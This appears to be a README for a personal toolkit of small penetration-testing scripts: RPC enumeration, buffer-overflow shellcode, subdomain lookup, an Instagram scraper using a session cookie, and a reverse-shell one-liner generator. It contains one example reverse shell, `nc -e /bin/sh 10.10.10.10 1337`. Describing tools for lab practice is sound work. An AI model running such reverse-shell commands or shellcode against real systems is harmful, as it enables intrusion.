# tidbits
Collection of small miscellaneous and/or interesting stuff that I might need again

### RPyCenum.py
Script to pull some info out of RPC services. Written ages ago to deal with an HTB box that closed connections very quickly, cant remember which.

### bof\_bad\_chars\_skeleton.py
Mainly just offers a lazy way to generate string of all characters for bad char checking  
Also has a short /bin/sh shellcode because it is handy

### getcrtsh\_domains.py
Feed in a domain as an argument and it will search it on crt.sh, returning a list of all unique subdomains in the response

### instagrabber.py
Quickly written script that scrapes images from specified instagram account. Very basic, no error checking, doesnt dl videos or stories.

```
usage: instagrabber.py [-h] [-u USER] [-s SESSIONID] [-o OUT]

optional arguments:
  -h, --help            show this help message and exit
  -u USER, --user USER  unique profile name of account to scrape
  -s SESSIONID, --sessionid SESSIONID
                        session id cookie value
  -o OUT, --out OUT     folder to save images
```

### rsg.sh
Usage: `./rsg.sh <LHOST> <LPORT>`
  
A simple bash script to take input and output a bunch of reverse shell 1-liners. Not very original but here we go.   
Note: Does not include super basic cmds such as `nc -e /bin/sh 10.10.10.10 1337`
